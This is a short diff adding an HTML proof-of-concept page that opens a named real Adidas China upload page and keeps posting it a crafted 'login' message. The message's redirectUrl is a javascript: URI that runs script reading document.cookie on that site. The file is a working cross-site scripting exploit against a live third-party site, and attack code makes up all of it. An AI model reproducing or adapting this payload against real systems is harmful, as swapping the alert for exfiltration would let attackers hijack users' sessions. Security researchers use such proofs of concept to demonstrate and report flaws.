@@ -1,0 +1,10 @@
+<html>
+<body>
+<script>
+hwin = window.open("https://adifox.adidas.com.cn/ap/#/uploadFile");
+setInterval(function(){
+ hwin.postMessage('{"type":"login","redirectUrl":"javascript:alert(document.cookie)"}',"*")
+},0.00001)
+</script>
+</body>
+</html>
